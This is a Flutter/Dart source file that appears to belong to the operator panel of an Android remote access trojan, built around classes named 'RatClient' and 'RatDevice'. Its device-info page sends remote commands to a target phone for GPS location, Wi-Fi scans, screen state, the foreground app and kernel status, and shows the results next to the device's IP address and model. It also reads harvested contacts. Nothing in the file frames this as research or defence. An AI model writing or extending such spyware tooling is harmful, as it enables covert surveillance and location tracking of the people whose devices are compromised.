import 'dart:async';

import 'package:flutter/material.dart';

import 'rat_client.dart';
import '../theme/neo.dart';

class DeviceInfoPage extends StatefulWidget {
  final RatClient client;
  final String deviceId;
  const DeviceInfoPage({super.key, required this.client, required this.deviceId});

  @override
  State<DeviceInfoPage> createState() => _DeviceInfoPageState();
}

class _DeviceInfoPageState extends State<DeviceInfoPage> {
  bool _refreshing = false;

  RatClient get client => widget.client;
  String get deviceId => widget.deviceId;

  dynamic get _fgApp => client.dataFor(deviceId)['foregroundApp'];
  dynamic get _screenState => client.dataFor(deviceId)['screenState'];
  dynamic get _kernelInfo => client.dataFor(deviceId)['kernelInfo'];
  dynamic get _wifi => client.dataFor(deviceId)['wifi'];
  dynamic get _location => client.dataFor(deviceId)['location'];
  dynamic get _contacts => client.dataFor(deviceId)['contacts'];

  RatDevice? get _device => client.deviceById(deviceId);

  @override
  void initState() {
    super.initState();
    client.addListener(_onClient);
  }

  @override
  void dispose() {
    client.removeListener(_onClient);
    super.dispose();
  }

  void _onClient() {
    if (!mounted) return;
    setState(() {});
  }

  Future<void> _refresh() async {
    if (_refreshing) return;
    setState(() => _refreshing = true);
    try {
      await Future.wait([
        client.sendCommand(deviceId, 'getForegroundApp', ''),
        client.sendCommand(deviceId, 'getScreenState', ''),
        client.sendCommand(deviceId, 'kernelInfo', ''),
        client.sendCommand(deviceId, 'wifi:scan', ''),
        client.sendCommand(deviceId, 'getLocation', ''),
      ]);
    } catch (_) {}
    if (mounted) setState(() => _refreshing = false);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      appBar: AppBar(
        backgroundColor: Neo.bg,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Neo.gold, size: 20),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text('DEVICE INFO',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 14,
                fontWeight: FontWeight.w700,
                letterSpacing: 2,
                color: Neo.gold)),
        centerTitle: true,
        actions: [
          IconButton(
            icon: _refreshing
                ? const SizedBox(
                    width: 18,
                    height: 18,
                    child: CircularProgressIndicator(strokeWidth: 2, color: Neo.gold))
                : const Icon(Icons.refresh, color: Neo.gold, size: 20),
            onPressed: _refreshing ? null : _refresh,
          ),
        ],
      ),
      body: AnimatedBuilder(
        animation: client,
        builder: (context, _) {
          return SingleChildScrollView(
            padding: const EdgeInsets.fromLTRB(16, 8, 16, 24),
            child: Column(
              children: [
                const SizedBox(height: 12),
                _buildDeviceCard(),
                const SizedBox(height: 14),
                _buildScreenCard(),
                const SizedBox(height: 14),
                _buildNetworkCard(),
                const SizedBox(height: 14),
                _buildBatteryCard(),
                const SizedBox(height: 14),
                _buildLocationCard(),
                const SizedBox(height: 14),
                _buildAppsCard(),
                const SizedBox(height: 14),
                _buildKernelCard(),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildInfoRow(String label, String value, {Color? valueColor}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(label,
              style: const TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 10,
                  fontWeight: FontWeight.w600,
                  letterSpacing: 1,
                  color: Neo.textMuted)),
          const SizedBox(width: 12),
          Flexible(
            child: Text(value,
                textAlign: TextAlign.end,
                overflow: TextOverflow.ellipsis,
                maxLines: 1,
                style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    color: valueColor ?? Neo.sky)),
          ),
        ],
      ),
    );
  }

  Widget _buildCardHeader(IconData icon, String title, Color color) {
    return Row(
      children: [
        Container(
          padding: const EdgeInsets.all(6),
          decoration: BoxDecoration(
            color: color.withValues(alpha: 0.1),
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: color.withValues(alpha: 0.3), width: 1),
          ),
          child: Icon(icon, size: 14, color: color),
        ),
        const SizedBox(width: 10),
        Text(title,
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 12,
                fontWeight: FontWeight.w800,
                letterSpacing: 2,
                color: color)),
      ],
    );
  }

  Widget _buildCard({required Widget child, Color borderColor = Neo.gold}) {
    return NeoCard(
      borderColor: borderColor.withValues(alpha: 0.25),
      padding: const EdgeInsets.all(14),
      child: child,
    );
  }

  Widget _buildDeviceCard() {
    final d = _device;
    final fg = _fgApp;
    final model = (fg is Map ? fg['deviceModel'] : null) ?? d?.raw['model'] ?? d?.raw['deviceModel'] ?? '—';
    final brand = d?.raw['brand'] ?? d?.raw['manufacturer'] ?? '—';
    final sdk = (fg is Map ? fg['sdkVersion'] : null) ?? d?.info.sdkVersion ?? d?.raw['sdkVersion'] ?? '—';
    final androidVer = d?.info.androidVersion ?? d?.raw['androidVersion'] ?? '—';
    final truncatedId = deviceId.length > 16 ? '${deviceId.substring(0, 16)}…' : deviceId;

    return _buildCard(
      borderColor: Neo.gold,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildCardHeader(Icons.phone_android, 'DEVICE', Neo.gold),
          const SizedBox(height: 12),
          _buildInfoRow('MODEL', '$model'),
          _buildInfoRow('BRAND', '$brand'),
          _buildInfoRow('ANDROID', '$androidVer'),
          _buildInfoRow('SDK', '$sdk'),
          _buildInfoRow('DEVICE ID', truncatedId),
        ],
      ),
    );
  }

  Widget _buildScreenCard() {
    final s = _screenState;
    String screenStatus = 'UNKNOWN';
    String brightness = '—';
    String timeout = '—';
    String resolution = '—';

    if (s is Map) {
      final screenOn = s['screenOn'] ?? s['screen'];
      if (screenOn == false || screenOn == 'OFF') {
        screenStatus = 'OFF';
      } else if (screenOn == true || screenOn == 'ON') {
        screenStatus = 'ON';
      } else if (screenOn != null) {
        screenStatus = screenOn.toString().toUpperCase();
      }
      brightness = s['brightness']?.toString() ?? '—';
      timeout = s['screenTimeout']?.toString() ?? '—';
      resolution = s['resolution'] ?? '—';
    }

    final statusColor = screenStatus == 'ON'
        ? Neo.mint
        : screenStatus == 'OFF'
            ? Neo.coral
            : Neo.peach;

    return _buildCard(
      borderColor: Neo.lavender,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildCardHeader(Icons.phone_iphone, 'SCREEN', Neo.lavender),
          const SizedBox(height: 12),
          _buildInfoRow('STATUS', screenStatus, valueColor: statusColor),
          _buildInfoRow('BRIGHTNESS', brightness),
          _buildInfoRow('TIMEOUT', timeout),
          _buildInfoRow('RESOLUTION', resolution),
        ],
      ),
    );
  }

  Widget _buildNetworkCard() {
    final w = _wifi;
    String ssid = '—';
    String ip = '—';
    String signal = '—';

    if (w is List && w.isNotEmpty) {
      final first = w.first;
      if (first is Map) {
        ssid = first['SSID'] ?? first['ssid'] ?? first['networkName'] ?? '—';
        signal = first['signalLevel']?.toString() ?? first['rssi']?.toString() ?? '—';
      }
    } else if (w is Map) {
      ssid = w['ssid'] ?? w['SSID'] ?? w['connectedSsid'] ?? '—';
      ip = w['ip'] ?? w['ipAddress'] ?? '—';
      signal = w['signalLevel']?.toString() ?? w['rssi']?.toString() ?? '—';
    }

    final d = _device;
    ip = d?.raw['ip'] ?? d?.raw['ipAddress'] ?? ip;

    return _buildCard(
      borderColor: Neo.sky,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildCardHeader(Icons.wifi, 'NETWORK', Neo.sky),
          const SizedBox(height: 12),
          _buildInfoRow('SSID', '$ssid'),
          _buildInfoRow('IP ADDRESS', '$ip'),
          _buildInfoRow('SIGNAL', '$signal'),
        ],
      ),
    );
  }

  Widget _buildBatteryCard() {
    final d = _device;
    final level = d?.info.battery;
    final charging = d?.info.charging ?? false;
    final batteryStr = level != null ? '$level%' : '—';
    final chargeStr = charging ? 'CHARGING' : 'NOT CHARGING';
    final chargeColor = charging ? Neo.mint : Neo.textMuted;

    return _buildCard(
      borderColor: Neo.mint,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildCardHeader(Icons.battery_std, 'BATTERY', Neo.mint),
          const SizedBox(height: 12),
          _buildInfoRow('LEVEL', batteryStr, valueColor: _batteryColor(level)),
          _buildInfoRow('STATUS', chargeStr, valueColor: chargeColor),
        ],
      ),
    );
  }

  Color _batteryColor(int? level) {
    if (level == null) return Neo.textMuted;
    if (level > 60) return Neo.mint;
    if (level > 30) return Neo.peach;
    return Neo.coral;
  }

  Widget _buildLocationCard() {
    final loc = _location;
    String lat = '—';
    String lon = '—';
    String timestamp = '—';

    if (loc is Map) {
      lat = loc['lat']?.toString() ?? loc['latitude']?.toString() ?? '—';
      lon = loc['lon']?.toString() ?? loc['lng']?.toString() ?? loc['longitude']?.toString() ?? '—';
      final ts = loc['timestamp'] ?? loc['time'];
      if (ts != null) {
        timestamp = ts.toString();
      }
    }

    return _buildCard(
      borderColor: Neo.peach,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildCardHeader(Icons.location_on, 'LOCATION', Neo.peach),
          const SizedBox(height: 12),
          _buildInfoRow('LATITUDE', lat),
          _buildInfoRow('LONGITUDE', lon),
          _buildInfoRow('TIMESTAMP', timestamp),
        ],
      ),
    );
  }

  Widget _buildAppsCard() {
    final fg = _fgApp;
    String appName = '—';
    String packageName = '—';

    if (fg is Map) {
      appName = fg['appName'] ?? fg['name'] ?? '—';
      packageName = fg['packageName'] ?? fg['package'] ?? '—';
    }

    return _buildCard(
      borderColor: Neo.cyan,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildCardHeader(Icons.apps, 'APPS', Neo.cyan),
          const SizedBox(height: 12),
          _buildInfoRow('APP NAME', '$appName'),
          _buildInfoRow('PACKAGE', '$packageName'),
        ],
      ),
    );
  }

  Widget _buildKernelCard() {
    final k = _kernelInfo;
    String kernelStatus = '—';
    String mode = '—';
    String active = '—';

    if (k is Map) {
      kernelStatus = k['status'] ?? k['kernelStatus'] ?? '—';
      mode = k['mode'] ?? k['kernelMode'] ?? '—';
      active = k['active']?.toString() ?? k['isActive']?.toString() ?? '—';
    }

    return _buildCard(
      borderColor: Neo.rose,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildCardHeader(Icons.memory, 'KERNEL', Neo.rose),
          const SizedBox(height: 12),
          _buildInfoRow('STATUS', '$kernelStatus'),
          _buildInfoRow('MODE', '$mode'),
          _buildInfoRow('ACTIVE', '$active'),
        ],
      ),
    );
  }
}
